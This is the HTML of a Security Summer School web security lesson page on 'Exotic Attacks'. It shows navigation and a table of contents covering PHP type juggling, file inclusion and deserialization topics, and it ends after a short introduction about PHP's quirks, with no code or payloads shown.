<!doctype html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=generator content="Hugo 0.85.0"><meta name=ROBOTS content="INDEX, FOLLOW"><link rel="shortcut icon" href=/favicons/favicon.ico><link rel=apple-touch-icon href=/favicons/apple-touch-icon-180x180.png sizes=180x180><link rel=icon type=image/png href=/favicons/favicon-16x16.png sizes=16x16><link rel=icon type=image/png href=/favicons/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/favicons/android-36x36.png sizes=36x36><link rel=icon type=image/png href=/favicons/android-48x48.png sizes=48x48><link rel=icon type=image/png href=/favicons/android-72x72.png sizes=72x72><link rel=icon type=image/png href=/favicons/android-96x96.png sizes=96x96><link rel=icon type=image/png href=/favicons/android-144x144.png sizes=144x144><link rel=icon type=image/png href=/favicons/android-192x192.png sizes=192x192><title>Security Summer School</title><meta name=description content="Introduction
As a web developer, you need to pay attention to the quirks of your chosen programming language.
There are lots of vulnerabilities …"><meta property="og:title" content><meta property="og:description" content="Introduction As a web developer, you need to pay attention to the quirks of your chosen programming language. There are lots of vulnerabilities generated by the developer’s disregard to language-specific details or just by programming mistakes.
The most common server-side language on the web today is still PHP. There are lots of legacy websites which used this language to begin with, and a complete refactor is just not worth it. Today, even if there are better options for the server-side choice, PHP is still pretty popular."><meta property="og:type" content="article"><meta property="og:url" content="/web/exotic-attacks/"><meta property="article:section" content="web"><meta property="og:site_name" content="Security Summer School"><meta itemprop=name content><meta itemprop=description content="Introduction As a web developer, you need to pay attention to the quirks of your chosen programming language. There are lots of vulnerabilities generated by the developer’s disregard to language-specific details or just by programming mistakes.
The most common server-side language on the web today is still PHP. There are lots of legacy websites which used this language to begin with, and a complete refactor is just not worth it. Today, even if there are better options for the server-side choice, PHP is still pretty popular."><meta itemprop=wordCount content="3526"><meta itemprop=keywords content><meta name=twitter:card content="summary"><meta name=twitter:title content><meta name=twitter:description content="Introduction As a web developer, you need to pay attention to the quirks of your chosen programming language. There are lots of vulnerabilities generated by the developer’s disregard to language-specific details or just by programming mistakes.
The most common server-side language on the web today is still PHP. There are lots of legacy websites which used this language to begin with, and a complete refactor is just not worth it. Today, even if there are better options for the server-side choice, PHP is still pretty popular."><link rel=preload href=/scss/main.min.959cc3579647d04265a1bb70b679a0771e7f7f7050bd3a694c2edd07f32972ca.css as=style><link href=/scss/main.min.959cc3579647d04265a1bb70b679a0771e7f7f7050bd3a694c2edd07f32972ca.css rel=stylesheet integrity><script src=https://code.jquery.com/jquery-3.5.1.min.js integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin=anonymous></script><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-00000000-0','auto'),ga('send','pageview'))</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body class=td-page><header><nav class="js-navbar-scroll navbar navbar-expand navbar-dark flex-column flex-md-row td-navbar"><a class=navbar-brand href=/><span class=navbar-logo><svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 500 500" style="enable-background:new 0 0 500 500"><g><path style="fill:#fff" d="M116.8525 421.9722c-5.7041.0-10.3442-4.3127-10.3442-9.6129V88.183c0-5.3002 4.6401-9.6117 10.3442-9.6117H320.858c3.0347.0 9.3959.5498 11.7506 2.6302l.3545.3442 58.905 63.2912c2.3101 2.491 2.9202 8.4928 2.9202 11.3184v256.2039c0 5.3002-4.6407 9.6129-10.3436 9.6129H116.8525z"/><g><g><g><path style="fill:#767676" d="M384.4445 423.2066H116.852c-6.3839.0-11.5786-4.8658-11.5786-10.8474V88.1831c0-5.9804 5.1947-10.8461 11.5786-10.8461h204.0062c.377.0 9.2786.0329 12.568 2.9389l.3947.3833 58.9508 63.337c3.2135 3.4652 3.2514 11.7924 3.2514 12.1593v256.2036C396.0231 418.3408 390.8284 423.2066 384.4445 423.2066zM116.5079 411.9189c.0848.0278.1999.0531.3441.0531h267.5925c.1442.0.2581-.0253.3441-.0531V156.1556c-.0076-.9033-.3593-3.7347-.7034-5.0037l-57.6527-61.9416c-1.4651-.3176-4.4533-.6389-5.5742-.6389H116.852c-.143.0-.2594.024-.3441.0531V411.9189zm267.4533-261.149zM327.0321 89.371v.0013V89.371z"/></g></g></g><g><g><path style="fill:#5b7fc0" d="M189.0874 210.1754l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.025 2.454-11.4897 6.4116-15.4473C177.5953 212.627 183.0601 210.1742 189.0874 210.1754zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403S197.0816 234.1722 197.0804 232.033z"/><path style="opacity:.3;fill:#fff" d="M189.0898 210.176c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 212.6276 183.0612 210.176 189.0898 210.176zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 236.239 197.0839 234.2399 197.0839 232.0372z"/><g><defs><path id="SVGID_1_" d="M194.7376 237.6875c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.999 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 234.2399 196.1861 236.239 194.7376 237.6875z"/></defs><clipPath id="SVGID_2_"><use xlink:href="#SVGID_1_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_2_);fill:#fff" d="M190.0704 225.0237c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 225.7247 191.9774 225.0237 190.0704 225.0237z"/><path style="opacity:.13;clip-path:url(#SVGID_2_);fill:#020202" d="M190.0704 225.0237c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 225.7247 191.9774 225.0237 190.0704 225.0237z"/></g><g><defs><path id="SVGID_3_" d="M189.0898 210.176c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 212.6276 183.0612 210.176 189.0898 210.176zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 236.239 197.0839 234.2399 197.0839 232.0372z"/></defs><clipPath id="SVGID_4_"><use xlink:href="#SVGID_3_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_4_);fill:#5b7fc0" d="M172.6595 215.6045c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8612 12.0547.0024 21.8636-9.797 21.8613-21.8612.0024-3.8475-1.0151-7.6326-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 209.1953 176.6171 211.647 172.6595 215.6045z"/></g></g><rect x="198.8952" y="225.1043" style="fill:#5b7fc0" width="122.6266" height="13.8671"/></g><g><path style="fill:#d95140" d="M189.0874 155.7611l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.0249 2.454-11.4897 6.4116-15.4473C177.5953 158.2128 183.0601 155.7599 189.0874 155.7611zm7.993 21.8577c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403C196.2508 181.7667 197.0816 179.758 197.0804 177.6188z"/><path style="opacity:.3;fill:#fff" d="M189.0898 155.7617c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 158.2134 183.0612 155.7617 189.0898 155.7617zm7.9941 21.8613c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 181.8248 197.0839 179.8256 197.0839 177.623z"/><g><defs><path id="SVGID_5_" d="M194.7376 183.2733c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.9989 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 179.8256 196.1861 181.8248 194.7376 183.2733z"/></defs><clipPath id="SVGID_6_"><use xlink:href="#SVGID_5_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_6_);fill:#fff" d="M190.0704 170.6095c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 171.3104 191.9774 170.6095 190.0704 170.6095z"/><path style="opacity:.13;clip-path:url(#SVGID_6_);fill:#020202" d="M190.0704 170.6095c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 171.3104 191.9774 170.6095 190.0704 170.6095z"/></g><g><defs><path id="SVGID_7_" d="M189.0898 155.7617c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 158.2134 183.0612 155.7617 189.0898 155.7617zm7.9941 21.8613c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 181.8248 197.0839 179.8256 197.0839 177.623z"/></defs><clipPath id="SVGID_8_"><use xlink:href="#SVGID_7_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_8_);fill:#d95140" d="M172.6595 161.1903c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8613 12.0547.0024 21.8636-9.797 21.8613-21.8613.0024-3.8474-1.0151-7.6326-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 154.7811 176.6171 157.2327 172.6595 161.1903z"/></g><rect x="198.8952" y="170.69" style="fill:#d95140" width="122.6266" height="13.8671"/></g><g><g><path style="fill:#56a55c" d="M189.5379 264.6147l.0012-.0012c7.7751.0012 15.0294 4.1862 18.932 10.9235 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032-5.8394.0-11.3281-2.2733-15.458-6.4032-4.13-4.13-6.4032-9.6186-6.4056-15.4628.0012-6.0249 2.454-11.4897 6.4116-15.4472C178.0458 267.0663 183.5105 264.6135 189.5379 264.6147zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6538 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403C196.7013 290.6202 197.5321 288.6115 197.5309 286.4723z"/><path style="opacity:.3;fill:#fff" d="M189.5403 264.6153c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8065-21.8612-21.8613.0-6.0285 2.4516-11.492 6.4116-15.452C178.0482 267.0669 183.5117 264.6153 189.5403 264.6153zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.6366 290.6783 197.5344 288.6792 197.5344 286.4765z"/><g><defs><path id="SVGID_9_" d="M195.1881 292.1268c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.9989 7.9942-7.9941 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.5344 288.6792 196.6366 290.6783 195.1881 292.1268z"/></defs><clipPath id="SVGID_10_"><use xlink:href="#SVGID_9_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_10_);fill:#fff" d="M190.5209 279.463c-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7446-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9941 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C194.239 280.164 192.4279 279.463 190.5209 279.463z"/><path style="opacity:.13;clip-path:url(#SVGID_10_);fill:#020202" d="M190.5209 279.463c-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7446-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9941 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C194.239 280.164 192.4279 279.463 190.5209 279.463z"/></g><g><defs><path id="SVGID_11_" d="M189.5403 264.6153c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8065-21.8612-21.8613.0-6.0285 2.4516-11.492 6.4116-15.452C178.0482 267.0669 183.5117 264.6153 189.5403 264.6153zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.6366 290.6783 197.5344 288.6792 197.5344 286.4765z"/></defs><clipPath id="SVGID_12_"><use xlink:href="#SVGID_11_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_12_);fill:#56a55c" d="M173.11 270.0439c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8613 12.0547.0024 21.8636-9.797 21.8613-21.8613.0024-3.8474-1.0151-7.6326-2.9353-10.9462-3.8977-6.7325-11.1497-10.9151-18.926-10.9151C182.5311 263.6346 177.0676 266.0863 173.11 270.0439z"/></g></g><rect x="199.3456" y="279.5436" style="fill:#56a55c" width="122.6266" height="13.8671"/></g><g><g><path style="fill:#f1bc42" d="M189.0874 318.7208l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3305-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.025 2.454-11.4897 6.4116-15.4472C177.5953 321.1724 183.0601 318.7196 189.0874 318.7208zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403S197.0816 342.7176 197.0804 340.5784z"/><path style="opacity:.3;fill:#fff" d="M189.0898 318.7214c7.7763.0 15.0283 4.1826 18.926 10.915 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8612-12.0547.0024-21.8636-9.8065-21.8612-21.8612.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 321.173 183.0612 318.7214 189.0898 318.7214zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 344.7844 197.0839 342.7853 197.0839 340.5826z"/><g><defs><path id="SVGID_13_" d="M194.7376 346.2329c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.999 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 342.7853 196.1861 344.7844 194.7376 346.2329z"/></defs><clipPath id="SVGID_14_"><use xlink:href="#SVGID_13_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_14_);fill:#fff" d="M190.0704 333.5691c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0834 6.1218 2.8788C193.7885 334.2701 191.9774 333.5691 190.0704 333.5691z"/><path style="opacity:.13;clip-path:url(#SVGID_14_);fill:#020202" d="M190.0704 333.5691c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0834 6.1218 2.8788C193.7885 334.2701 191.9774 333.5691 190.0704 333.5691z"/></g><g><defs><path id="SVGID_15_" d="M189.0898 318.7214c7.7763.0 15.0283 4.1826 18.926 10.915 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8612-12.0547.0024-21.8636-9.8065-21.8612-21.8612.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 321.173 183.0612 318.7214 189.0898 318.7214zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 344.7844 197.0839 342.7853 197.0839 340.5826z"/></defs><clipPath id="SVGID_16_"><use xlink:href="#SVGID_15_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_16_);fill:#f1bc42" d="M172.6595 324.15c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8612 12.0547.0024 21.8636-9.797 21.8613-21.8612.0024-3.8474-1.0151-7.6327-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 317.7407 176.6171 320.1924 172.6595 324.15z"/></g></g><rect x="198.8952" y="333.6497" style="fill:#f1bc42" width="122.6266" height="13.8671"/></g></g></svg></span><span class="text-uppercase font-weight-bold">Security Summer School</span></a><div class="td-navbar-nav-scroll ml-md-auto" id=main_navbar><ul class="navbar-nav mt-2 mt-lg-0"><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/binary/><span>Binary Exploitation</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/essentials/><span>Security Essentials</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class="nav-link active" href=/web/><span class=active>Web Security</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/community/><span>Community</span></a></li></ul></div><div class="navbar-nav d-none d-lg-block"><input type=search class="form-control td-search-input" placeholder="&#xf002; Search this site…" aria-label="Search this site…" autocomplete=off></div></nav></header><div class="container-fluid td-outer"><div class=td-main><div class="row flex-xl-nowrap"><aside class="col-12 col-md-3 col-xl-2 td-sidebar d-print-none"><div id=td-sidebar-menu class=td-sidebar__inner><form class="td-sidebar__search d-flex align-items-center"><input type=search class="form-control td-search-input" placeholder="&#xf002; Search this site…" aria-label="Search this site…" autocomplete=off>
<button class="btn btn-link td-sidebar__toggle d-md-none p-0 ml-3 fas fa-bars" type=button data-toggle=collapse data-target=#td-section-nav aria-controls=td-docs-nav aria-expanded=false aria-label="Toggle section navigation"></button></form><nav class="collapse td-sidebar-nav" id=td-section-nav><ul class="td-sidebar-nav__section pr-md-3 ul-0"><li class="td-sidebar-nav__section-title td-sidebar-nav__section with-child active-path" id=m-web-li><a href=/web/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__section tree-root" id=m-web><span>Web Security</span></a><ul class=ul-1><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-webweb-basics-browser-security-model-li><a href=/web/web-basics-browser-security-model/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-webweb-basics-browser-security-model><span>01. Web Basics & Browser Security Model</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-webcookies-session-management-access-control-li><a href=/web/cookies-session-management-access-control/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-webcookies-session-management-access-control><span>02. Cookies & Session Management & Access Control</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-websql-injection-li><a href=/web/sql-injection/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-websql-injection><span>04. SQL Injection</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-webrecon-enumeration-li><a href=/web/recon-enumeration/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-webrecon-enumeration><span>06. Recon & Enumeration</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-webframework-api-vulnerabilities-li><a href=/web/framework-api-vulnerabilities/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-webframework-api-vulnerabilities><span>07. Framework & API Vulnerabilities</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child active-path" id=m-webexotic-attacks-li><a href=/web/exotic-attacks/ title class="align-left pl-0 active td-sidebar-link td-sidebar-link__page" id=m-webexotic-attacks><span class=td-sidebar-nav-active-item>08. Exotic Attacks</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-web05-injection-part-2readme-li><a href=/web/05-injection-part-2/readme/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-web05-injection-part-2readme><span></span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-web09-privilege-escalationreadme-li><a href=/web/09-privilege-escalation/readme/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-web09-privilege-escalationreadme><span></span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-web10-best-practicesreadme-li><a href=/web/10-best-practices/readme/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-web10-best-practicesreadme><span></span></a></li></ul></li></ul></nav></div></aside><aside class="d-none d-xl-block col-xl-2 td-sidebar-toc d-print-none"><div class="td-page-meta ml-2 pb-1 pt-2 mb-0"><a href=https://github.com/security-summer-school/security-summer-school.github.io/edit/master/content/en/web/exotic-attacks/index.md target=_blank><i class="fa fa-edit fa-fw"></i> Edit this page</a>
<a href="https://github.com/security-summer-school/security-summer-school.github.io/new/master/content/en/web/exotic-attacks/index.md?filename=change-me.md&value=---%0Atitle%3A+%22Long+Page+Title%22%0AlinkTitle%3A+%22Short+Nav+Title%22%0Aweight%3A+100%0Adescription%3A+%3E-%0A+++++Page+description+for+heading+and+indexes.%0A---%0A%0A%23%23+Heading%0A%0AEdit+this+template+to+create+your+new+page.%0A%0A%2A+Give+it+a+good+name%2C+ending+in+%60.md%60+-+e.g.+%60getting-started.md%60%0A%2A+Edit+the+%22front+matter%22+section+at+the+top+of+the+page+%28weight+controls+how+its+ordered+amongst+other+pages+in+the+same+directory%3B+lowest+number+first%29.%0A%2A+Add+a+good+commit+message+at+the+bottom+of+the+page+%28%3C80+characters%3B+use+the+extended+description+field+for+more+detail%29.%0A%2A+Create+a+new+branch+so+you+can+preview+your+new+file+and+request+a+review+via+Pull+Request.%0A" target=_blank><i class="fa fa-edit fa-fw"></i> Create child page</a>
<a href="https://github.com/security-summer-school/security-summer-school.github.io/issues/new?title=" target=_blank><i class="fab fa-github fa-fw"></i> Create documentation issue</a>
<a href=https://github.com/security-summer-school/issues/new target=_blank><i class="fas fa-tasks fa-fw"></i> Create project issue</a>
<a id=print href=/web/_print/><i class="fa fa-print fa-fw"></i> Print entire section</a></div><div class=td-toc><nav id=TableOfContents><ul><li><a href=#how-php-compares-values>How PHP compares values</a></li><li><a href=#loose-comparison-vs-strict-comparison--vs->Loose Comparison vs. Strict Comparison (<code>==</code> vs <code>===</code>)</a></li><li><a href=#how-vulnerability-arises>How vulnerability arises</a><ul><li><a href=#conditions-of-exploitation>Conditions of exploitation</a></li></ul></li><li><a href=#avoiding-type-juggling-issues-in-php-code>Avoiding type juggling issues in PHP code</a><ul><li><a href=#use-strict-comparison-operators>Use strict comparison operators</a></li><li><a href=#specify-the-strict-option-for-functions-that-compare>Specify the &ldquo;strict&rdquo; option for functions that compare</a></li><li><a href=#avoid-typecasting-before-comparison>Avoid typecasting before comparison</a></li></ul></li></ul><ul><li><a href=#magic-hashes>Magic hashes</a></li><li><a href=#bypassing-strcmp-function>Bypassing <code>strcmp()</code> function</a></li><li><a href=#using-preg_replace-to-execute-commands>Using <code>preg_replace()</code> to execute commands</a></li></ul><ul><li><ul><li><a href=#exploit-with-the-__wakeup-in-the-unserialize-function>Exploit with the <code>__wakeup</code> in the <code>unserialize()</code> function</a></li><li><a href=#authentication-bypass---type-juggling>Authentication bypass - Type juggling</a></li></ul></li></ul><ul><li><a href=#local-file-inclusion>Local File Inclusion</a></li><li><a href=#remote-file-inclusion>Remote File Inclusion</a><ul><li><a href=#example-of-a-simple-reverse-shell-in-php>Example of a simple reverse shell in PHP:</a></li></ul></li></ul><ul><li><a href=#python-pickle>Python <code>pickle</code></a></li></ul></nav></div></aside><main class="col-12 col-md-9 col-xl-8 pl-md-5" role=main><nav aria-label=breadcrumb class="d-none d-md-block d-print-none"><ol class="breadcrumb spb-1"><li class=breadcrumb-item><a href=/web/>Web Security</a></li><li class="breadcrumb-item active" aria-current=page><a href=/web/exotic-attacks/>08. Exotic Attacks</a></li></ol></nav><div class=td-content><h1></h1><header class=article-meta></header><h1 id=introduction>Introduction</h1><p>As a web developer, you need to pay attention to the quirks of your chosen programming language.
There are lots of vulnerabilities generated by the developer’s disregard to language-specific details or just by programming mistakes.</p><p>The most common server-side language on the web today is still <strong>PHP</strong>.
There are lots of legacy websites which used this language to begin with, and a complete refactor is just not worth it.
